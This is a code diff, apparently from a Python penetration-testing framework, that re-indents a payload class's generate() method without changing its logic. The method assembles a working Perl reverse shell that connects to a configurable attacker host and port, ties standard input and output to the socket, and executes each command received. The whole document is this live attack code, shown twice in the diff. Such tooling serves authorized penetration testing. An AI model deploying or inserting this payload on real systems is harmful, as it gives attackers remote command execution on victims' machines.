@@ -21,10 +21,10 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "use IO;foreach my $key(keys %ENV){" +
-            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
-            self.lhost +
-            ":" +
-            str(self.lport) +
-            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
+                "use IO;foreach my $key(keys %ENV){" +
+                "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
+                self.lhost +
+                ":" +
+                str(self.lport) +
+                "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
         )
